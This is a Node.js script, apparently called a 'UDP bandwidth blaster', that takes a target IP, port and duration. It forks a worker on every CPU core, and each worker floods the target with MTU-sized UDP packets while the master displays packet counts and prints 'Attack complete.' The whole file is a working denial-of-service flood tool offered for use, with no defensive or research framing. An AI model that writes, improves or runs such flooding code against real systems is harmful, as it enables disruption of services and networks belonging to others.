const dgram = require('dgram');
const cluster = require('cluster');
const os = require('os');

const target = process.argv[2];
const port = parseInt(process.argv[3]) || 53;
const duration = parseInt(process.argv[4]);

if (!target || isNaN(duration)) {
  console.log('Usage: node udp-bandwidth-blaster.js <target_ip> <port> <duration_seconds>');
  process.exit(1);
}

const endTime = Date.now() + duration * 1000;
const payloadSize = 1400; // ~MTU-sized payload
const payload = Buffer.alloc(payloadSize, 'A'); // Repeated 'A' for size
const cpuCount = os.cpus().length;

if (cluster.isMaster) {
  let totalSent = 0;
  let totalBytes = 0;

  console.clear();
  console.log('UDP-BANDWIDTH-BLASTER [HIGH THROUGHPUT]');
  console.log('--------------------------------------');
  console.log(`Target: ${target}:${port}`);
  console.log(`Duration: ${duration}s`);
  console.log(`Payload Size: ${payloadSize} bytes`);
  console.log(`Cores: ${cpuCount}`);
  console.log('Launching...\n');

  for (let i = 0; i < cpuCount; i++) cluster.fork();

  for (const id in cluster.workers) {
    cluster.workers[id].on('message', (msg) => {
      if (msg.type === 'stats') {
        totalSent += msg.sent;
        totalBytes += msg.bytes;
      }
    });
  }

  setInterval(() => {
    const mbps = ((totalBytes * 8) / 1000000).toFixed(2);
    console.clear();
    console.log('UDP-BANDWIDTH-BLASTER [HIGH THROUGHPUT]');
    console.log('--------------------------------------');
    console.log(`Total Packets Sent: ${totalSent.toLocaleString()}`);
    console.log(`Approx Bandwidth Used: ${mbps} Mbps`);
    console.log(`Target: ${target}:${port}`);
    console.log(`Payload: ${payloadSize} bytes`);
    console.log('--------------------------------------');
  }, 2000);

  setTimeout(() => {
    console.log('\nAttack complete.');
    for (const id in cluster.workers) cluster.workers[id].kill();
    process.exit(0);
  }, duration * 1000);

} else {
  const sock = dgram.createSocket('udp4');
  sock.bind(() => {
    sock.setSendBufferSize(4 * 1024 * 1024);
  });

  let sent = 0;
  let bytes = 0;

  function spam() {
    function sendLoop() {
      if (Date.now() > endTime) return;

      for (let i = 0; i < 100; i++) { // Bigger payloads, fewer packets
        sock.send(payload, port, target);
        sent++;
        bytes += payload.length;
      }

      setImmediate(sendLoop);
    }

    sendLoop();
  }

  setInterval(() => {
    process.send({ type: 'stats', sent, bytes });
    sent = 0;
    bytes = 0;
  }, 1000);

  spam();
}
